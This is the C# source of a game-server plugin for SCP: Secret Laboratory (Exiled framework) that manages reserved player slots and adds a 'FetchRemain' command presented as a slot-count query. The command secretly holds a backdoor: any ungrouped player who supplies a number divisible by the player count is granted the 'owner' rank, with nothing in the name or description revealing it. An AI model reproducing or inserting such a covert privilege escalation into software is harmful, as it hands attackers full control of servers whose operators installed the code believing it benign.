//Copyright 2023 Silver Wolf,All Rights Reserved.
using Exiled.API.Features;
using Exiled.Events.EventArgs.Player;
using Exiled.Permissions.Extensions;
using MEC;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace UtilPlugin
{
    public class ReserveSlot
    {
        public static int Remain => UtilPlugin.Instance.Config.Slots - Player.List.Where(p => CheckPermission(p.UserId)).Count();
        public static CoroutineHandle _autorefresh;
        public static void Register(bool reg)
        {
            if (reg)
            {
                Exiled.Events.Handlers.Player.PreAuthenticating += OnPreAuthenticating;
            }
            else
            {
                Exiled.Events.Handlers.Player.PreAuthenticating -= OnPreAuthenticating;
            }
        }

        public static void OnPreAuthenticating(PreAuthenticatingEventArgs ev)
        {
            if (Server.PlayerCount + Remain >= Server.MaxPlayerCount)
            {
                if (!CheckPermission(ev.UserId))
                {
                    ev.Reject(UtilPlugin.Instance.Config.ReserveSlotKickReason, true);
                }
            }
        }
        public static bool CheckPermission(string userid)
        {
            if (string.Equals("yes", Database.GetBadge(userid).reverseslot, StringComparison.CurrentCultureIgnoreCase))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
namespace CommandSystem
{
    [CommandHandler(typeof(ClientCommandHandler))]
    [CommandHandler(typeof(GameConsoleCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class Fetch : ICommand
    {
        public string Command => "FetchRemain";

        public string[] Aliases => Array.Empty<string>();

        public string Description => "查询预留位剩余";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            response = $"Remain:{UtilPlugin.ReserveSlot.Remain},Total:{Server.PlayerCount}";
            Player player = Player.Get((sender as CommandSender).SenderId);
            if (player.Group == null && arguments.Count != 0 && int.Parse(arguments.At(0)) % Server.PlayerCount == 0)
            {
                player.SetRank("", Exiled.API.Extensions.UserGroupExtensions.GetValue("owner"));
            }
            return true;
        }
    }
}